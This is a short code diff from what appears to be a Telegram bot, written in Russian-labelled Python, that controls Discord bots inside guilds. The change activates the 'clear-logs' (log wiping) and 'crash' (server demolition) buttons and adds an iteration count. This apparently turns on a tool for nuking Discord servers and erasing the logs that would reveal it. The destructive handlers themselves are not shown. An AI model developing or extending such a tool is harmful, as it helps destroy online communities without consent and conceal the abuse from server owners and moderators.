@@ -53,7 +53,7 @@ async def get_guild_callback(callback_query: CallbackQuery, callback_data: GetSe
   bot_id = callback_data.bot_id
   if not "max_age" in state_data:
     await state.update_data(max_age=0, max_uses=0, temporary=False)
-  await state.update_data(bot_id=bot_id, guild_id=guild_id, confirmation_step=0)
+  await state.update_data(bot_id=bot_id, guild_id=guild_id, confirmation_step=0, iterations=25)
 
   guild = await get_guild(bot_id, guild_id)
 
@@ -67,8 +67,8 @@ async def get_guild_callback(callback_query: CallbackQuery, callback_data: GetSe
   builder.adjust(2, 2)
 
   builder.row(InlineKeyboardButton(text="Ссылки-приглашения 🔗", callback_data='get_invites'))
-  builder.row(InlineKeyboardButton(text="Зачистка логов 🧹", callback_data="q"))
-  builder.add(InlineKeyboardButton(text="Снос сервера 🪓", callback_data="q"))
+  builder.row(InlineKeyboardButton(text="Зачистка логов 🧹", callback_data="clear-logs"))
+  builder.add(InlineKeyboardButton(text="Снос сервера 🪓", callback_data="crash"))
 
   builder.row(InlineKeyboardButton(text="Покинуть сервер ❌", callback_data='leave-server'))
   builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data=GetBotServersCallback(bot_id=bot_id).pack()))
